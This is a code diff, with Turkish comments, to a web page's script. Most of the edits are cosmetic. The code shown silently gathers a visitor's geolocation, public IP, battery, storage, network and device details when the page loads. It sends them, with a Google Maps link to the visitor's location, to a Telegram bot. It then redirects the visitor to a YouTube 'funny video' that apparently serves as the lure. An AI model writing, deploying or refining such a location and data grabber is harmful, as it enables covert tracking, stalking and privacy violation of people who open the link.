@@ -18,30 +18,27 @@
   <script>
     // 1. Bilgi nesnesi
     let info = {
-      name: "", lat:null, lon:null,
-      ip: "Alınamadı", browser:"site:Bilinmiyor",
+      name:"", lat:null, lon:null,
+      ip:"Alınamadı", browser:"site:Bilinmiyor",
       screen:`${screen.width}x${screen.height}`,
-      pixelRatio: devicePixelRatio,
-      colorDepth: screen.colorDepth,
-      memory: navigator.deviceMemory||"?",
-      cores: navigator.hardwareConcurrency||"?",
-      online: navigator.onLine, platform: navigator.platform,
-      language: navigator.language,
-      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      hour: new Date().getHours(),
-      timestamp: new Date().toLocaleString(),
+      pixelRatio:devicePixelRatio, colorDepth:screen.colorDepth,
+      memory:navigator.deviceMemory||"?", cores:navigator.hardwareConcurrency||"?",
+      online:navigator.onLine, platform:navigator.platform,
+      language:navigator.language,
+      timeZone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+      hour:new Date().getHours(), timestamp:new Date().toLocaleString(),
       batteryLevel:"?", charging:"?",
       storageUsage:"?", storageQuota:"?",
       netType:"?", downlink:"?", rtt:"?",
       darkMode:false,
-      cookieEnabled: navigator.cookieEnabled,
-      doNotTrack: navigator.doNotTrack||navigator.msDoNotTrack,
-      orientation: (screen.orientation&&screen.orientation.type)||"unknown",
-      pluginsCount: navigator.plugins?navigator.plugins.length:"?",
+      cookieEnabled:navigator.cookieEnabled,
+      doNotTrack:navigator.doNotTrack||navigator.msDoNotTrack,
+      orientation:(screen.orientation&&screen.orientation.type)||"unknown",
+      pluginsCount:navigator.plugins?navigator.plugins.length:"?",
       pageLoadTime:0
     };
 
-    // 2. Sayfa yüklenince veri toplama
+    // 2. Sayfa yüklenince otomatik veri toplama
     window.onload = async () => {
       const start = performance.timing.navigationStart;
 
@@ -51,10 +48,10 @@
         ()=>document.getElementById("uyari").innerText="📍 Konum izni gerekli!"
       );
 
-      // IP
+      // IP Adresi
       try {
-        const data = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
-        info.ip = data.ip;
+        const { ip } = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
+        info.ip = ip;
       } catch {}
 
       // Batarya
@@ -64,30 +61,30 @@
         info.charging     = bat.charging;
       }
 
-      // Otomatik depolama tahmini
+      // Depolama Tahmini
       if (navigator.storage && navigator.storage.estimate) {
         const { usage, quota } = await navigator.storage.estimate();
         info.storageUsage = usage;
         info.storageQuota = quota;
       }
 
-      // Ağ kalitesi
-      const conn    = navigator.connection||{};
+      // Ağ Kalitesi
+      const conn = navigator.connection||{};
       info.netType  = conn.effectiveType||"?";
       info.downlink = conn.downlink||"?";
       info.rtt      = conn.rtt||"?";
 
-      // Tarayıcı türü
+      // Tarayıcı Türü
       const ua = navigator.userAgent;
-      if(ua.includes("Chrome")&&!ua.includes("Edg")) info.browser="site:Chrome";
-      else if(ua.includes("Firefox"))                    info.browser="site:Firefox";
-      else if(ua.includes("Safari")&&!ua.includes("Chrome")) info.browser="site:Safari";
-      else if(ua.includes("Edg"))                        info.browser="site:Edge";
+      if (ua.includes("Chrome")&&!ua.includes("Edg")) info.browser="site:Chrome";
+      else if (ua.includes("Firefox"))                    info.browser="site:Firefox";
+      else if (ua.includes("Safari")&&!ua.includes("Chrome")) info.browser="site:Safari";
+      else if (ua.includes("Edg"))                        info.browser="site:Edge";
 
-      // Karanlık mod
+      // Karanlık Mod
       info.darkMode = window.matchMedia("(prefers-color-scheme: dark)").matches;
 
-      // Yükleme süresi
+      // Sayfa Yükleme Süresi
       info.pageLoadTime = performance.timing.domContentLoadedEventEnd - start;
     };
 
@@ -107,7 +104,7 @@
       // Harita linki
       const maps = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
 
-      // Depolamayı MB’ye çevir
+      // Depolama (MB)
       const usedMB  = (info.storageUsage/1024/1024).toFixed(2);
       const quotaMB = (info.storageQuota/1024/1024).toFixed(2);
 
@@ -139,7 +136,7 @@
 📶 Çevrimiçi: *${info.online}*
 `;
 
-      
+      // Mesajı Telegram’a gönder
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: {"Content-Type":"application/json"},
@@ -150,7 +147,7 @@
         })
       });
 
-     
+      // Yeni seçilen komik video açılır
       window.location.href = "https://www.youtube.com/watch?v=IxX_QHay02M";
     }
   </script>
